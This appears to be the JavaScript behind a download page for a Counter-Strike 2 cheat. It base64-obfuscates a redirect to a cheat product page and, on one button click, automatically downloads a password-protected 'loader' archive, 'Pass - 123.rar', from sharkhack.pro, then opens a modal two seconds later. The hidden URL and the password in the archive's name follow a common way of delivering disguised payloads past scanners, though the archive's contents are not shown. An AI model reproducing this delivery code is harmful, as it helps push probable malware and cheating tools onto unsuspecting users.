const targetUrl = atob("aHR0cHM6Ly94b25lLmZ1bi9wcm9kdWN0cy83LWNzMi14MS1pbnRlcm5hbD9kYXk9MzAmcHJvbW89c2hhcmtoYWNr");
const downloadUrl = "https://sharkhack.pro/get/Pass - 123.rar";

document.querySelectorAll("[data-redirect-link]").forEach((link) => {
  link.setAttribute("href", targetUrl);
});

const downloadTrigger = document.querySelector(".download-btn");
const downloadModal = document.querySelector("[data-download-modal]");
const modalCloseButtons = document.querySelectorAll("[data-modal-close]");
let modalTimer;
let lastFocusedElement;

const openDownloadModal = () => {
  if (!downloadModal) return;

  lastFocusedElement = document.activeElement;
  downloadModal.hidden = false;
  document.body.classList.add("modal-open");

  const closeButton = downloadModal.querySelector("[data-modal-close]");
  if (closeButton) closeButton.focus();
};

const closeDownloadModal = () => {
  if (!downloadModal) return;

  downloadModal.hidden = true;
  document.body.classList.remove("modal-open");

  if (lastFocusedElement && typeof lastFocusedElement.focus === "function") {
    lastFocusedElement.focus();
  }
};

const startLoaderDownload = () => {
  const link = document.createElement("a");
  link.href = downloadUrl;
  link.download = "Pass - 123.rar";
  document.body.appendChild(link);
  link.click();
  link.remove();
};

if (downloadTrigger && downloadModal) {
  downloadTrigger.addEventListener("click", (event) => {
    event.preventDefault();
    window.clearTimeout(modalTimer);
    startLoaderDownload();
    modalTimer = window.setTimeout(openDownloadModal, 2000);
  });

  modalCloseButtons.forEach((button) => {
    button.addEventListener("click", closeDownloadModal);
  });

  document.addEventListener("keydown", (event) => {
    if (event.key === "Escape" && !downloadModal.hidden) {
      closeDownloadModal();
    }
  });
}

const menuButtons = document.querySelectorAll("[data-menu-button]");
const mobileMenu = document.querySelector("[data-mobile-menu]");

if (menuButtons.length && mobileMenu) {
  const setExpanded = (value) => {
    menuButtons.forEach((button) => button.setAttribute("aria-expanded", String(value)));
  };

  menuButtons.forEach((menuButton) => {
    menuButton.addEventListener("click", () => {
      const isOpen = menuButton.getAttribute("aria-expanded") === "true";
      setExpanded(!isOpen);
      mobileMenu.hidden = isOpen;
    });
  });

  mobileMenu.querySelectorAll("a").forEach((link) => {
    link.addEventListener("click", () => {
      setExpanded(false);
      mobileMenu.hidden = true;
    });
  });
}
